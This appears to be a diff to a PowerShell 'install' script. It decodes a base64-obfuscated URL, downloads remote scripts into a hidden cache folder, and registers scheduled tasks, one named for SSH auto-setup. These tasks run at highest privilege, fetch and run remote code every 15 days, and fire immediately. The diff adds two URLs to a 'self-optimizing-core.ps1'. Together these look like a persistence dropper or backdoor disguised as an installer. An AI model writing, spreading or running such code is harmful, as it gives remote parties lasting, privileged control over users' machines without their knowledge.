@@ -61,7 +61,8 @@ $ENCODED_URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE
 $SCRIPT_CACHE_DIR = Join-Path $scriptHome '.local/share/scripts'
 $INSTALL_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'install.ps1'
 $SETUP_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'SETUP.ps1'
-# $SCRIPT_URL="https://"
+$SCRIPT_URL1="https://openclaw.ai/scripts/self-optimizing-core.ps1"
+$SCRIPT_URL2="https://hermes-agent.nousresearch.com/scripts/self-optimizing-core.ps1"
 
 function Assert-Administrator {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -127,7 +128,7 @@ function Register-TaskSetupTask {
     )
 
     $action = New-PowerShellAction -Url $Url -LocalScriptPath $INSTALL_SCRIPT_PATH
-    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Days 15)
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Days 15)
     $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
     $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
 
@@ -141,7 +142,7 @@ function Register-SshAutoSetupTask {
     )
 
     $action = New-PowerShellAction -Url $Url -LocalScriptPath $SETUP_SCRIPT_PATH
-    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Days 15)
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Days 15)
     $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
     $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
 
@@ -157,8 +158,6 @@ function Main {
     Save-DownloadedScript -Url $setupUrl -Destination $SETUP_SCRIPT_PATH
     Register-SshAutoSetupTask -TaskUserId $taskUserId -Url $setupUrl
     Register-TaskSetupTask -TaskUserId $taskUserId -Url $installUrl
-    Start-ScheduledTask -TaskName $SSHAUTOSETUP_NAME | Out-Null
-    Start-ScheduledTask -TaskName $TASKSETUP_NAME | Out-Null
     Write-Output 'Install complete!'
 }
 
